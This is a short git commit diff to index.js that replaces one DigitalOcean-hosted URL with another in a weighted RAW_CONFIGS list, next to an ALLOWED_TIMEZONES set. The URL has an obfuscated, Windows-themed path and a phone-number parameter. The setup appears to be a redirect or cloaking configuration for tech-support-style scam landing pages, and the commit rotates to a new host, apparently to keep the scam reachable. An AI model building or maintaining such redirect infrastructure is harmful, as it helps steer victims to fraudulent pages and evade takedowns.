60a2f665e6f954d28b3fa674320aab948f1ea8b5
paalakash <palaksh452@gmail.com>
2026-06-07 07:41:10 +0530

    Update RAW_CONFIGS URL for seahorse app

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://sea-turtle-app-2-i5si3.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3990", weight: 1.0 }
+    { url: "https://seahorse-app-2-f7pd2.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3990", weight: 1.0 }
 
 ];
 
